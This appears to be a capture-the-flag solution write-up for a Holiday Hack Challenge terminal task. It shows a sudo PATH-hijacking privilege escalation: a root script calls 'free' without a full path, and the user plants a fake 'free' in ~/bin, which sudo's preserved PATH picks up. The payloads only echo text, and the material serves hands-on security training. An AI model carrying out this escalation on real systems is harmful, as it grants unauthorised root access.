# Neighborhood Watch Bypass

Difficulty: :material-star::material-star-outline::material-star-outline::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Assist Kyle at the old data center with a fire alarm that just won't chill.

??? quote "Kyle Parrish"

    If you spot a fire, let me know! I'm Kyle, and I've been around the Holiday Hack Challenge scene for years as arnydo - picked up multiple Super Honorable Mentions along the way.

    When I'm not fighting fires or hunting vulnerabilities, you'll find me on a unicycle or juggling - I once showed up a professional clown with his own clubs!

    My family and I love exploring those East Tennessee mountains, and honestly, geocaching teaches you a lot about finding hidden things - useful in both firefighting and hacking.

    Anyway, I could use some help here. This fire alarm keeps going nuts but there's no fire. I checked.

    I think someone has locked us out of the system. Can you see if you can get back in?

## Hints

??? tip "Path Hijacking"

    Be careful when writing scripts that allow regular users to run them. One thing to be wary of is {=not using full paths to executables...these can be hijacked.=}

??? tip "What Are My Powers?"

    You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy {=switch that will tell you what powers your user has.=}

## Solution

??? success "Solution to question 1"

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
Matching Defaults entries for chiuser on 7ff5c7a0bc86:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 7ff5c7a0bc86:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ $PATH
bash: /home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
```

```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ cat /usr/local/bin/system_status.sh
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):"
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo "echo 'path hijack'" > free
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ chmod +x free
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ /usr/local/bin/system_status.sh
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
path hijack

Disk usage (alarm logs and recordings):
Filesystem      Size  Used Avail Use% Mounted on
overlay         296G   16G  268G   6% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1       296G   16G  268G   6% /etc/hosts
tmpfs            16G     0   16G   0% /proc/acpi
tmpfs            16G     0   16G   0% /sys/firmware

Active fire department connections:
 18:45:36 up 21:17,  0 users,  load average: 0.09, 0.15, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

Fire alarm monitoring processes:
chiuser       41  0.0  0.0   3472  1608 pts/0    S+   18:45   0:00 grep -E (alarm|fire|monitor|safety)

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
```

```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo "echo './runtoanswer'" > free
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh
```

## Response

!!! quote "Kyle Parrish"

    Wow! Thank you so much! I didn't realize seudo was so powerful. Especially when misconfigured. Who knew a simple privilege escalation could unlock the whole fire safety system?

    Now... will you sudo make me a sandwich?
